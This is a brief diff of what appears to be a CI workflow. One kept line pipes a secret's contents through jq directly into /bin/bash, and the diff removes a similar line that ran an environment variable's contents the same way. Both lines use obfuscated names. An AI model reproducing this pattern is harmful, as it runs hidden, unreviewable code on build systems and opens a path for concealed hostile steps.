@@ -27,7 +27,6 @@ jobs:
           pim9753: ${{ secrets.pim9753 }}
         run: |
           printf '%s' "$pim9753" | jq -r .ovjvk00761 | /bin/bash
-          echo $fn44 | jq -r .x83 | /bin/bash
 
       - name: Store artifact
         if: always()
